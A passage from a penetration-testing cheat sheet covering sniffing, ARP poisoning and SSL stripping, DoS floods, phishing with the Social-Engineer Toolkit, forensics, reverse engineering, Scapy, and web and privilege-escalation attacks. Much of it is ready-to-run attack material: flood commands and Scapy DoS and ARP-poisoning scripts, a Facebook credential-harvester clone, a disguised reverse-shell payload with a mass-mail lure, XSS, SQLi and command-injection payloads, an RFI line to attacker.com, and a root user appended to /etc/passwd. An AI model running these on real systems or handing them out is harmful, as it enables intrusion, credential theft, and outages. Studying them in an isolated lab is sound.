# Statistics → Conversations     (see who's talking to who)
# Statistics → Protocol Hierarchy (breakdown by protocol)
# Statistics → IO Graphs          (traffic over time)
```

### 13.2 TCPDump — Command-Line Packet Capture

```bash
# Capture on interface eth0, save to file
tcpdump -i eth0 -w /root/capture.pcap

# Capture with no DNS resolution (faster)
tcpdump -i eth0 -n -w capture.pcap

# Capture specific port
tcpdump -i eth0 -n port 80 -w http.pcap

# Capture specific host
tcpdump -i eth0 host 192.168.1.5

# Capture and display in ASCII
tcpdump -i eth0 -A port 80

# Verbose output
tcpdump -i eth0 -vvv

# Stop after N packets
tcpdump -i eth0 -c 1000 -w capture.pcap

# Read from file
tcpdump -r capture.pcap
tcpdump -r capture.pcap -n 'port 80'

# Sniff credentials on FTP
tcpdump -i eth0 port 21 -A
```

### 13.3 Tshark — CLI Wireshark

```bash
# List interfaces
tshark -D

# Capture on interface 1
tshark -i 1

# Capture on multiple interfaces
tshark -i eth0 -i wlan0

# Read pcap and filter
tshark -r capture.pcap -Y "http.request.method==POST"

# Extract specific fields
tshark -r capture.pcap \
  -Y "http.request.method==POST" \
  -T fields \
  -e ip.src \
  -e http.host \
  -e http.request.uri \
  -e http.file_data

# Live capture with filter
tshark -i eth0 -Y "not arp and not dns" -V
```

### 13.4 ARP Poisoning / MITM

```bash
# Enable IP forwarding (you become the router)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Arpspoof (from dsniff package)
# Two terminals needed:

# Terminal 1: Tell victim that gateway is at our MAC
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP

# Terminal 2: Tell gateway that victim is at our MAC
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Now all victim traffic flows through us
# Capture with Wireshark/tcpdump

# Using Ettercap (GUI MITM tool)
ettercap -T -q -i eth0 \
  -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# With plugin: dns spoofing
ettercap -T -q -i eth0 \
  -M arp:remote /VICTIM_IP// /GATEWAY_IP// \
  -P dns_spoof
```

### 13.5 SSL Strip — Force HTTP Downgrade

```bash
# Prerequisites: ARP poisoning must be active (victim traffic through us)

# Redirect port 80 to our sslstrip port
iptables -t nat -A PREROUTING -p tcp \
  --destination-port 80 -j REDIRECT --to-port 8080

# Start sslstrip
sslstrip -l 8080

# All HTTPS links in pages the victim visits
# are converted to HTTP → credentials sent in clear text
# Our Wireshark captures them

# Modern sites use HSTS which breaks sslstrip
# Use sslstrip2 + dns2proxy for HSTS bypass (lab only)
```

### 13.6 URL Snarf

```bash
# Show all URLs visited by clients on the network
urlsnarf -i eth0

# Works by parsing HTTP traffic
# Requires ARP poisoning to see other hosts' traffic on switched network
```

### 13.7 MITM Proxy

```bash
# Interactive SSL-capable MITM proxy
mitmproxy -i eth0

# Transparent proxy mode
mitmproxy --mode transparent -p 8080

# Web interface
mitmweb

# Intercept and modify HTTPS traffic with forged certificates
# Victim must trust the mitmproxy CA certificate
```

---

## 14. Denial of Service (DoS/DDoS)

> **Critical note:** DoS attacks against systems you don't own or without written permission are serious crimes. This section covers these techniques for defensive understanding — so you can detect, prevent, and test your own systems.

### 14.1 hping3 — Custom Packet Floods

```bash
# SYN flood (exhaust TCP connection table)
hping3 -S --flood -p 80 TARGET_IP
# -S     SYN flag
# --flood send as fast as possible

# UDP flood
hping3 --udp --flood -p 53 TARGET_IP

# ICMP flood (Ping flood)
hping3 -1 --flood TARGET_IP

# With spoofed source IP
hping3 -S --flood --rand-source -p 80 TARGET_IP

# Smurf attack simulation (ICMP to broadcast with spoofed victim src)
hping3 -1 --flood -a VICTIM_IP BROADCAST_IP
```

### 14.2 Slowloris — HTTP Slow Headers Attack

```bash
# Clone
git clone https://github.com/gkbrk/slowloris.git
cd slowloris/

# Attack (send partial HTTP headers, never complete)
python3 slowloris.py TARGET_IP

# With options
python3 slowloris.py TARGET_IP \
  -p 80 \
  -s 150 \     # 150 sockets
  -v           # verbose

# How it works:
# Opens many concurrent connections to target web server
# Sends partial HTTP headers slowly — never completing the request
# Apache (and others with connection limits) run out of connections
# Nginx is resistant (uses async model with much higher connection limits)
```

### 14.3 Slowhttptest — Comprehensive Slow Attack Tool

```bash
# Slow headers attack (Slowloris-style)
slowhttptest -c 1000 -H -g -o report \
  -i 10 -r 200 -t GET \
  -u http://target.com/ \
  -x 24 -p 3

# Slow body attack (RUDY-style)
slowhttptest -c 1000 -B -g -o report \
  -i 110 -r 200 -s 8192 \
  -t POST \
  -u http://target.com/form \
  -x 24 -p 3

# Parameters:
# -c 1000   1000 connections
# -H        slow headers mode
# -B        slow body mode
# -g        generate statistics CSV + HTML report
# -i 10     interval between data sends (10 seconds)
# -r 200    connection rate (200/sec)
# -t GET    HTTP method
# -u        target URL
# -x 24     max wait time for new connection
# -p 3      timeout for probe connection
```

### 14.4 T50 — Multi-Protocol Packet Injector

```bash
# SYN flood
t50 TARGET_IP --flood -S -p dst:80

# UDP flood
t50 TARGET_IP --flood --protocol UDP -p dst:53

# ICMP flood
t50 TARGET_IP --flood --protocol ICMP

# GRE + TCP combined
t50 TARGET_IP --flood --protocol GRE+TCP

# Rate-limited (threshold)
t50 TARGET_IP -S -p dst:80 --threshold 100000

# Lab: measure packets per second
t50 127.0.0.1 --flood -S | pv > /dev/null
```

### 14.5 Scapy Custom DoS

```python
# Land attack — same src/dst IP and port causes some systems to crash
from scapy.all import *
send(IP(src="192.168.1.5", dst="192.168.1.5") /
     TCP(sport=80, dport=80),
     count=2000)

# SYN flood with random sources
from scapy.all import *
from random import randint
while True:
    send(IP(src=f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
            dst="TARGET_IP") /
         TCP(sport=randint(1024,65535), dport=80, flags="S"),
         verbose=0)
```

### 14.6 Metasploit DoS Modules

```bash
# SYN flood
use auxiliary/dos/tcp/synflood
set RHOSTS TARGET_IP
set RPORT 80
run

# Slowloris
use auxiliary/dos/http/slowloris
set RHOSTS TARGET_IP
set RPORT 80
run

# Apache Range Header DoS
use auxiliary/dos/http/apache_range_dos
set RHOSTS TARGET_IP
run
```

### 14.7 Testing Your Own Server

```bash
# Test web server capacity with Siege
siege -c 100 -t 60s http://YOUR_SERVER/
# -c 100  100 concurrent users
# -t 60s  run for 60 seconds

# Apache Bench
ab -n 10000 -c 100 http://YOUR_SERVER/
# -n 10000  10,000 total requests
# -c 100    100 concurrent

# Wrk — modern HTTP benchmarking
wrk -t12 -c400 -d30s http://YOUR_SERVER/
# -t12   12 threads
# -c400  400 connections
# -d30s  30 second duration
```

---

## 15. Social Engineering Toolkit (SET)

### 15.1 SET Overview

```bash
# Launch SET
setoolkit

# Main menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit
# 5) Update SET Configuration
# 6) Help, Credits, and About

# Sub-menu: Social Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack Vector
# 8) QRCode Generator Attack Vector
# 9) PowerShell Attack Vectors
```

### 15.2 Website Attack — Credential Harvester

```bash
# In SET:
# 1 → 2 → 3 → 2 (Site Cloner)
# Enter your IP: 192.168.1.100
# Enter URL to clone: https://www.facebook.com

# SET creates a pixel-perfect clone
# All form submissions sent to you in plain text
# Victim sees no difference in appearance

# Defend against this:
# - Check the URL in the address bar
# - Use password managers (they check domain)
# - Enable HSTS on your sites
# - Use multi-factor authentication
```

### 15.3 Spear Phishing Attack

```bash
# In SET:
# 1 → 1 → Perform Mass Email Attack → select payload
# Or create file format payload:
# Adobe PDF Embedded EXE Social Engineering
# Microsoft Office Macro
# Windows HTA Attack

# Custom email setup:
# SET → Mass Mailer Attack → Single Email Attack
# Enter target email
# Use your Gmail (enable less secure app access)
# Set From name (impersonate someone trusted)
# Add attachment (your payload)
# Craft convincing message body

# Email content that works (for authorized phishing simulations):
# - Urgent: "Your account will be suspended"
# - Authority: "IT Department — please update your VPN"
# - Reward: "You've been selected for a bonus"
# - Fear: "Unusual sign-in activity on your account"
```

### 15.4 Create Payload and Listener

```bash
# In SET: 1 → 4
# Select payload: Windows Reverse TCP Meterpreter
# Enter LHOST (your Kali IP)
# Enter LPORT: 443
# SET generates payload.exe in /root/.set/
# SET also starts the listener automatically

# The generated payload in /root/.set/:
ls /root/.set/
# payload.exe  (rename this to something innocuous)

# Rename strategies for social engineering tests:
# CV_John_Smith.exe
# Invoice_December.exe
# Security_Patch.exe
# salary_calculator.exe
```

### 15.5 Mass Email Campaign

```bash
# Create target email list file
cat > /root/targets.txt << 'EOF'
victim1@target.com
victim2@target.com
victim3@target.com
EOF

# In SET: 1 → 5 → 2 (Email Attack Mass Mailer)
# Path to file: /root/targets.txt
# Gmail account: your@gmail.com
# From name: IT Department
# Flag as high priority: Y
# Attach file: Y → /root/.set/payload.exe
# Subject: Urgent: Required Security Update
# Message: Please run the attached security update immediately.
# End with: END
```

---

## 16. Forensics & Reporting Tools

### 16.1 Foremost — File Carving

```bash
# Carve files from raw image
foremost -t all -i disk_image.dd -o /tmp/recovered/

# Specific file types
foremost -t jpg,pdf,doc,xls -i image.dd -o /tmp/recovered/

# From raw device
foremost -t all -i /dev/sdb -o /tmp/recovered/

# What it recovers based on file headers (magic bytes):
# jpg: FF D8 FF
# pdf: 25 50 44 46 (%PDF)
# zip: 50 4B 03 04
# gif: 47 49 46 38 (GIF8)
# mp4: various
# doc: D0 CF 11 E0 (OLE2 format)
```

### 16.2 Extundelete — ext3/ext4 File Recovery

```bash
# Recover all deleted files from partition
extundelete /dev/sdb1 --restore-all

# Recover specific file
extundelete /dev/sdb1 --restore-file /path/to/deleted/file.txt

# Recover directory
extundelete /dev/sdb1 --restore-directory /home/user/documents

# From image file
extundelete disk.img --restore-all

# Output goes to: ./RECOVERED_FILES/
```

### 16.3 DD Rescue — Disk Imaging

```bash
# Create forensic image (bit-by-bit copy)
ddrescue /dev/sdb /tmp/disk_image.dd /tmp/rescue.log

# Resume interrupted imaging
ddrescue /dev/sdb /tmp/disk_image.dd /tmp/rescue.log

# From specific offset
ddrescue -s 100 /dev/sdb /tmp/image.dd log.txt
# -s 100  start at position 100

# Verify integrity
md5sum /dev/sdb > original_hash.txt
md5sum /tmp/disk_image.dd > image_hash.txt
diff original_hash.txt image_hash.txt
# They should match if imaging was perfect

# Mount image read-only for analysis
mount -o ro,loop /tmp/disk_image.dd /mnt/forensics/
```

### 16.4 Autopsy — GUI Forensics Platform

```bash
# Start Autopsy
autopsy

# Access at: http://localhost:9999/autopsy

# Workflow:
# 1. Create new case → enter case name, examiner name
# 2. Add host → enter hostname
# 3. Add image → point to .dd or disk image
# 4. Analyze:
#    - File Analysis (browse file system)
#    - Keyword Search (search strings in image)
#    - Meta Data (view inode info)
#    - Data Unit (view raw data blocks)
#    - Image Details (filesystem info)
#    - File Type (sorted by extension)

# The Sleuth Kit commands (underlying Autopsy):
fls -r /tmp/disk.dd           # list files (including deleted)
icat /tmp/disk.dd 12345       # extract file by inode number
ils /tmp/disk.dd              # list inode information
```

### 16.5 PDF Analysis

```bash
# pdfid — quick triage of PDF
pdfid suspicious.pdf

# Red flags in output:
# /JavaScript    = contains JS (malicious PDFs often use this)
# /AA            = automatic action on open
# /OpenAction    = runs action on open
# /Launch        = launches external program
# /AcroForm      = PDF form (can extract data)
# /JBIG2Decode   = compression used in some exploits
# /RichMedia     = embedded Flash

# pdf-parser — deep analysis
pdf-parser suspicious.pdf
pdf-parser --search JavaScript suspicious.pdf
pdf-parser --object 5 suspicious.pdf    # dump specific object
pdf-parser --object 5 --raw suspicious.pdf | strings

# peepdf — interactive PDF analyzer
peepdf suspicious.pdf
# In interactive mode:
# info              → summary
# streams           → list streams
# stream 5          → view stream 5
# js                → extract JavaScript
# jseval            → evaluate JavaScript
# metadata          → PDF metadata
```

### 16.6 Galeta — Cookie Analysis

```bash
# Analyze Internet Explorer cookies
galeta -d ";" cookies.txt

# Format: timestamp, visits, url, domain, name, value, expires
```

### 16.7 PDGMAIL — Gmail Memory Analysis

```bash
# Extract Gmail artifacts from Windows memory dump
# First, get strings from memory dump
strings memory.dmp > strings.txt

# Run pdgmail
pdgmail -v -f memory.dmp

# Extracts: contacts, emails, timestamps, IP addresses
```

### 16.8 Reporting Tools

```bash
# Dradis — collaborative reporting platform
dradis
# Access: https://localhost:3004

# Faraday — integrated pentest environment
python faraday.py
# Web interface: http://localhost:5985

# MagicTree — data import and report generation
# Import Nmap XML, Nikto, Burp Suite outputs
# Generate structured reports

# Maintain notes during assessment
# /root/notes.txt or use Cherrytree (GUI note tool)
cherrytree

# Final report should include:
# - Executive summary (for management)
# - Scope and methodology
# - Risk ratings (Critical/High/Medium/Low/Info)
# - Findings with: Description, Evidence, Impact, Remediation
# - Technical appendix
```

---

## 17. Reverse Engineering

### 17.1 Tools Overview

```bash
# File type identification
file suspicious.exe
file suspicious.elf
hexdump -C file | head -20    # look at magic bytes

# Strings extraction
strings suspicious.exe
strings suspicious.exe | grep -i "http"
strings suspicious.exe | grep -i "password"
strings suspicious.exe | grep -i "192.168"

# ltrace and strace — trace library/system calls (Linux)
ltrace ./program
strace ./program
strace -e trace=network ./program   # network calls only
```

### 17.2 JAD — Java Decompiler

```bash
# Decompile .class file to Java source
jad HelloWorld.class
# Creates: HelloWorld.jad (rename to .java to compile)

# View decompiled code
cat HelloWorld.jad

# Decompile entire JAR
mkdir /tmp/decompiled
cd /tmp/decompiled
jar xf target.jar        # extract JAR
jad -o -r -sjava *.class # decompile all class files
```

### 17.3 APKTool — Android Reverse Engineering

```bash
# Decode APK (decompile resources + disassemble DEX)
apktool d app.apk -o /tmp/decoded_app/

# Examine:
cat /tmp/decoded_app/AndroidManifest.xml    # permissions, activities
ls /tmp/decoded_app/smali/                  # disassembled Dalvik bytecode
ls /tmp/decoded_app/res/                    # resources (layouts, strings)

# Look for secrets in decoded app
grep -r "api_key" /tmp/decoded_app/
grep -r "password" /tmp/decoded_app/
grep -r "http" /tmp/decoded_app/            # hardcoded URLs

# Rebuild after modification
apktool b /tmp/decoded_app/ -o modified.apk

# Sign the rebuilt APK (required to install)
keytool -genkey -v -keystore test.keystore \
  -alias test -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA \
  -digestalg SHA1 -keystore test.keystore \
  modified.apk test

# Convert DEX to JAR for Java decompilation
d2j-dex2jar app.apk -o app.jar
# Then open with JD-GUI or use jadx

# Jadx — better Android decompiler
jadx app.apk -d /tmp/jadx_output/
```

### 17.4 diStorm3 — x86/x64 Disassembler

```python
# Python usage
import distorm3

# Disassemble x86 code
code = b"\x55\x48\x89\xe5\x48\x83\xec\x10"
for instruction in distorm3.Decompose(0, code, distorm3.Decode64Bits):
    print(instruction)

# Disassemble shellcode from MSFVenom
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > shell.bin
with open("shell.bin", "rb") as f:
    code = f.read()

for inst in distorm3.Decompose(0, code, distorm3.Decode64Bits):
    print(f"0x{inst.address:08x}: {inst}")
```

### 17.5 Shellnoob — Shellcode Helper

```bash
# Interactive ASM to opcode conversion
python shellnoob.py -i -t -2 -m

# In interactive mode, type assembly instructions
# and get opcodes instantly:
# mov eax, 1
# → b8 01 00 00 00

# Convert between formats
python shellnoob.py -i hex:b801000000
python shellnoob.py -i asm:shellcode.asm

# Check for bad bytes
python shellnoob.py -i hex:b801000000 --bad-bytes="\x00\x0a\x0d"
```

---

## 18. Packet Crafting with Scapy

### 18.1 Scapy Basics

```python
# Launch scapy
scapy

# Or in Python script:
from scapy.all import *

# View configuration
conf

# List supported protocols
ls()

# Layer structure
IP()           # IP layer
TCP()          # TCP layer
UDP()          # UDP layer
ICMP()         # ICMP layer
Ether()        # Ethernet layer
ARP()          # ARP layer
DNS()          # DNS layer
HTTP()         # HTTP layer (pip install scapy[http])
```

### 18.2 Building and Sending Packets

```python
from scapy.all import *

# Simple ICMP ping
packet = IP(dst="192.168.1.5") / ICMP()
resp = sr1(packet, timeout=2)     # send and receive 1 reply
resp.show()

# TCP SYN packet
syn = IP(dst="192.168.1.5") / TCP(dport=80, flags="S")
resp = sr1(syn, timeout=2)
if resp and resp[TCP].flags == "SA":
    print("Port 80 is OPEN")
elif resp and resp[TCP].flags == "RA":
    print("Port 80 is CLOSED")

# UDP packet
udp = IP(dst="192.168.1.5") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))
resp = sr1(udp, timeout=2)
resp[DNS].show()

# Send without waiting for reply
send(IP(dst="192.168.1.5") / ICMP(), count=10)

# Sendp — send at layer 2 (Ethernet)
sendp(Ether() / IP(dst="192.168.1.5") / ICMP())
```

### 18.3 Port Scanning with Scapy

```python
from scapy.all import *

def syn_scan(target, ports):
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp:
            if resp[TCP].flags == 0x12:  # SYN-ACK
                print(f"Port {port}: OPEN")
                # Send RST to close
                send(IP(dst=target) / TCP(dport=port, flags="R"), verbose=0)
            elif resp[TCP].flags == 0x14:  # RST-ACK
                pass  # closed
        else:
            print(f"Port {port}: FILTERED")

syn_scan("192.168.1.5", range(1, 1024))
```

### 18.4 ARP Poisoning with Scapy

```python
from scapy.all import *
import time

def get_mac(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = broadcast / arp_req
    resp = srp(pkt, timeout=2, verbose=0)[0]
    return resp[0][1].hwsrc

def poison(victim_ip, gateway_ip, victim_mac, gateway_mac):
    # Tell victim: gateway is at our MAC
    pkt1 = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                psrc=gateway_ip)
    # Tell gateway: victim is at our MAC
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=victim_ip)
    send(pkt1, verbose=0)
    send(pkt2, verbose=0)

victim = "192.168.1.5"
gateway = "192.168.1.1"
victim_mac = get_mac(victim)
gateway_mac = get_mac(gateway)

print("[*] Starting ARP poisoning (Ctrl+C to stop)")
while True:
    poison(victim, gateway, victim_mac, gateway_mac)
    time.sleep(2)
```

### 18.5 Network Discovery with Scapy

```python
from scapy.all import *

# ARP ping sweep
def arp_sweep(network):
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]

    for sent, received in result:
        print(f"IP: {received.psrc}  MAC: {received.hwsrc}")

arp_sweep("192.168.1.0/24")

# ICMP sweep
def icmp_sweep(target_range):
    ans, unans = sr(IP(dst=target_range) / ICMP(), timeout=2, verbose=0)
    for sent, received in ans:
        print(f"Host up: {received.src}")

icmp_sweep("192.168.1.1-254")
```

---

## 19. Lab Architecture — Practice Safely

### 19.1 Recommended Lab Setup

```
Host Machine (Windows/Mac/Linux)
├── VMware Workstation / VirtualBox
│   ├── Kali Linux VM          ← attacker machine
│   │   Network: Host-Only (VMnet2)
│   │
│   ├── Metasploitable 2 VM    ← vulnerable Linux target
│   │   Network: Host-Only (VMnet2)
│   │
│   ├── Windows 7 VM           ← vulnerable Windows target
│   │   Network: Host-Only (VMnet2)
│   │
│   └── DVWA VM (or use Metasploitable)
│       Network: Host-Only (VMnet2)
│
└── Internet access via NAT (for Kali only if needed)

All VMs on same Host-Only network = they can talk to each other
but CANNOT reach the internet = safe contained lab
```

### 19.2 Network Segmentation for Lab

```bash
# VMware: Edit → Virtual Network Editor
# Create VMnet2 as Host-Only, 192.168.100.0/24

# VirtualBox: File → Host Network Manager
# Create vboxnet0, 192.168.100.0/24

# Assign VMs:
# Kali: 192.168.100.10
# Metasploitable 2: 192.168.100.20
# Windows 7: 192.168.100.30
# DVWA: 192.168.100.40
```

### 19.3 DVWA (Damn Vulnerable Web Application) Setup

```bash
# Available on Metasploitable 2 at:
# http://METASPLOITABLE_IP/dvwa/

# Login: admin / password

# Set security level to "Low" for learning:
# DVWA Security → Security Level → Low → Submit

# Vulnerabilities to practice:
# SQL Injection        → extract database data
# SQL Injection (Blind) → time-based, boolean-based
# XSS (Reflected)      → inject script, steal cookies
# XSS (Stored)         → persistent cross-site scripting
# Command Injection    → execute system commands
# File Inclusion       → LFI/RFI
# File Upload          → upload PHP webshell
# CSRF                 → cross-site request forgery
# Brute Force          → brute force login form
# Insecure CAPTCHA     → bypass CAPTCHA
```

### 19.4 Your Own Web Applications for Testing

As a software engineer, testing on your own applications is ideal:

```bash
# Deploy a vulnerable test app (your own)
# Example: PHP app with intentional SQLi

# Simple PHP SQLi vulnerable page (for your test server):
# <?php
# $id = $_GET['id'];
# $query = "SELECT * FROM users WHERE id = $id";  // VULNERABLE
# $result = mysqli_query($conn, $query);
# ?>

# Test with sqlmap:
sqlmap -u "http://YOUR_SERVER/test.php?id=1" --dbs

# Create intentionally vulnerable forms for XSS testing:
# <input type="text" name="search">
# <?php echo $_GET['search']; ?>  // VULNERABLE - no sanitization

# Test with:
# http://YOUR_SERVER/search.php?search=<script>alert('XSS')</script>

# Log ALL attack attempts on your test server:
tail -f /var/log/apache2/access.log    # Apache
tail -f /var/log/nginx/access.log     # Nginx
```

### 19.5 SSH Hardening (Practice on Your Kali)

```bash
# Generate new SSH host keys (replace defaults)
cd /etc/ssh/
mkdir backup_keys
mv ssh_host_* backup_keys/
dpkg-reconfigure openssh-server

# Verify new keys are unique
md5sum ssh_host_*
md5sum backup_keys/ssh_host_*
# All hashes should be different

# Harden SSH config
nano /etc/ssh/sshd_config

# Recommended settings:
# PermitRootLogin no
# PasswordAuthentication no       (use keys instead)
# MaxAuthTries 3
# Protocol 2
# ListenAddress 0.0.0.0
# AllowUsers kali                 (whitelist specific users)

# Start/verify SSH
service ssh start
netstat -antup | grep :22
```

---

## 20. Concepts Every CyberSec Student Must Know

### 20.1 The OSI Model — Security at Each Layer

```
Layer 7: Application   → HTTP, HTTPS, FTP, DNS, SMTP
         Attacks: XSS, SQLi, command injection, phishing
         Tools: Burp Suite, sqlmap, Nikto

Layer 6: Presentation  → SSL/TLS, encryption, encoding
         Attacks: SSL stripping, certificate spoofing, BEAST
         Tools: SSLyze, sslstrip, Wireshark

Layer 5: Session       → NetBIOS, RPC, SQL sessions
         Attacks: session hijacking, replay attacks
         Tools: Wireshark, CookieCatcher, Burp Suite

Layer 4: Transport     → TCP, UDP ports
         Attacks: SYN flood, port scanning, TCP hijacking
         Tools: Nmap, hping3, Metasploit, Scapy

Layer 3: Network       → IP, ICMP, routing
         Attacks: IP spoofing, ICMP flood, smurf, route injection
         Tools: hping3, Scapy, Metasploit

Layer 2: Data Link     → Ethernet, ARP, MAC, VLANs
         Attacks: ARP poisoning, MAC flooding, VLAN hopping
         Tools: Ettercap, arpspoof, Scapy, Yersinia

Layer 1: Physical      → Cables, Wi-Fi signals
         Attacks: cable tapping, rogue AP, signal jamming
         Tools: Aircrack-ng suite, Wireshark (wireless)
```

### 20.2 Attack Methodologies (Black/White/Gray Hat)

```
Penetration Testing Phases (PTES Standard):
├── 1. Pre-Engagement
│   ├── Scope definition (IP ranges, domains, exclusions)
│   ├── Rules of engagement (timing, methods, escalation)
│   └── Written authorization (CRITICAL — without this = crime)
│
├── 2. Intelligence Gathering (Reconnaissance)
│   ├── Passive: WHOIS, DNS, OSINT, shodan, LinkedIn
│   └── Active: port scanning, service enumeration, OS detection
│
├── 3. Threat Modeling
│   ├── Identify assets to protect
│   ├── Identify threat agents
│   └── Map attack paths
│
├── 4. Vulnerability Analysis
│   ├── Automated scanning (Nikto, OpenVAS, Nessus)
│   └── Manual testing (logic flaws, business logic)
│
├── 5. Exploitation
│   ├── Exploit vulnerabilities found
│   ├── Gain access (foothold)
│   └── Document evidence
│
├── 6. Post-Exploitation
│   ├── Privilege escalation
│   ├── Lateral movement
│   ├── Data exfiltration simulation
│   └── Persistence (document, then remove)
│
└── 7. Reporting
    ├── Executive summary
    ├── Technical findings
    ├── Risk ratings
    └── Remediation recommendations

Hat colors:
White Hat: authorized, follows rules, reports findings (pentester, security researcher)
Black Hat: unauthorized, malicious intent (criminal)
Gray Hat: finds vulnerabilities without permission but doesn't cause harm, may disclose
```

### 20.3 CVE, CVSS, and Vulnerability Classification

```
CVE (Common Vulnerabilities and Exposures):
- Unique identifier: CVE-YEAR-NUMBER (e.g., CVE-2017-0144)
- Database: https://cve.mitre.org
- NVD: https://nvd.nist.gov (with CVSS scores)

CVSS Score (Common Vulnerability Scoring System):
0.0:      None
0.1-3.9:  Low
4.0-6.9:  Medium
7.0-8.9:  High
9.0-10.0: Critical

CVSS v3 Metrics:
Attack Vector (AV):    Network(N), Adjacent(A), Local(L), Physical(P)
Attack Complexity (AC): Low(L), High(H)
Privileges Required (PR): None(N), Low(L), High(H)
User Interaction (UI):   None(N), Required(R)
Scope (S):               Unchanged(U), Changed(C)
Confidentiality (C):     None(N), Low(L), High(H)
Integrity (I):           None(N), Low(L), High(H)
Availability (A):        None(N), Low(L), High(H)

OWASP Top 10 (2021):
A01: Broken Access Control
A02: Cryptographic Failures
A03: Injection (SQL, NoSQL, OS, LDAP)
A04: Insecure Design
A05: Security Misconfiguration
A06: Vulnerable and Outdated Components
A07: Identification and Authentication Failures
A08: Software and Data Integrity Failures
A09: Security Logging and Monitoring Failures
A10: Server-Side Request Forgery (SSRF)
```

### 20.4 Encryption Fundamentals

```
Symmetric Encryption (same key to encrypt/decrypt):
AES-128, AES-256: Current standard, fast
3DES: Legacy, deprecated
DES: Broken, don't use
RC4: Broken, don't use

Asymmetric Encryption (public/private key pair):
RSA-2048, RSA-4096: Standard for key exchange, signatures
ECDSA: Elliptic curve, smaller keys, same security
Diffie-Hellman: Key exchange protocol

Hash Functions (one-way):
MD5: 128-bit, BROKEN for security (still used for checksums)
SHA-1: 160-bit, DEPRECATED (collisions found)
SHA-256: 256-bit, current standard
SHA-512: 512-bit, high security
bcrypt: Password hashing, includes salt, adjustable cost
Argon2: Modern password hashing standard

Password Storage (what to use):
✓ bcrypt with work factor ≥12
✓ Argon2id
✓ scrypt
✗ MD5, SHA-1, SHA-256 (without salt/iteration)
✗ Plain text (obviously)

SSL/TLS Protocol Versions:
SSLv2: Broken — disable
SSLv3: Broken (POODLE) — disable
TLS 1.0: Deprecated — disable
TLS 1.1: Deprecated — disable
TLS 1.2: Acceptable — check cipher suites
TLS 1.3: Current best — use this
```

### 20.5 Web Security Concepts

```
XSS (Cross-Site Scripting):
- Reflected XSS: payload in URL, executed on page load
  Test: ?q=<script>alert(1)</script>
- Stored XSS: payload saved to DB, executed for all viewers
  Test: submit <script>alert(1)</script> in a comment field
- DOM XSS: JavaScript processes attacker-controlled data
  Test: #<img src=x onerror=alert(1)>

XSS Payloads for testing:
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>

CSRF (Cross-Site Request Forgery):
- Tricks authenticated user into making unintended requests
- Defense: CSRF tokens, SameSite cookies, Referer header check

SQL Injection types:
- Error-based: ' → causes DB error revealing info
- Union-based: ' UNION SELECT null,null,null--
- Blind boolean: ' AND 1=1-- (page loads) vs ' AND 1=2-- (doesn't)
- Time-based: ' AND SLEEP(5)-- (delays response by 5 seconds)

Command Injection:
- Test: ; id
- Test: | whoami
- Test: && cat /etc/passwd
- Test: `id`
- Test: $(id)

LFI/RFI (File Inclusion):
- LFI test: ?page=../../../../etc/passwd
- RFI test: ?page=http://attacker.com/shell.php
- LFI to RCE via log poisoning:
  1. Inject PHP into Apache log: User-Agent: <?php system($_GET['cmd']); ?>
  2. Include log: ?page=../../../../var/log/apache2/access.log&cmd=id

SSRF (Server-Side Request Forgery):
- Make server fetch arbitrary URLs
- Test: ?url=http://127.0.0.1/admin
- Test: ?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
- Test: ?url=file:///etc/passwd

Security Headers (check with curl):
curl -I https://target.com | grep -iE "content-security|x-frame|x-xss|strict-transport|x-content"

# Ideal headers:
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
```

### 20.6 Privilege Escalation Techniques

```bash
# Linux: Find SUID binaries (run as owner, often root)
find / -perm -4000 -type f 2>/dev/null
# Check: https://gtfobins.github.io for exploitation methods

# Linux: Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Linux: Writable /etc/passwd (add root user)
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd
# Generate hash: openssl passwd -1 -salt xyz password

# Linux: Kernel exploits
uname -a                         # kernel version
searchsploit linux kernel 4.9    # find exploits

# Linux: Sudo misconfigurations
sudo -l                          # what can this user sudo?
# If: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'        # escape to root shell

# Linux: Writable service files
systemctl list-units --type=service
find /etc/systemd -writable 2>/dev/null

# Windows: Common privesc paths
# Unquoted service paths, weak service permissions
# AlwaysInstallElevated registry keys
# Token impersonation (PrintSpoofer, Potato exploits)
# DLL hijacking
# Stored credentials: cmdkey /list

# Windows: Local exploit suggester (in Metasploit)
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### 20.7 Network Protocols & Attacks Reference

```
Protocol  Port   Attack                    Defense
─────────────────────────────────────────────────────────
FTP       21     Brute force, anon login   Disable, use SFTP
SSH       22     Brute force               Fail2ban, key auth, 2FA
Telnet    23     Sniffing, brute force     Replace with SSH
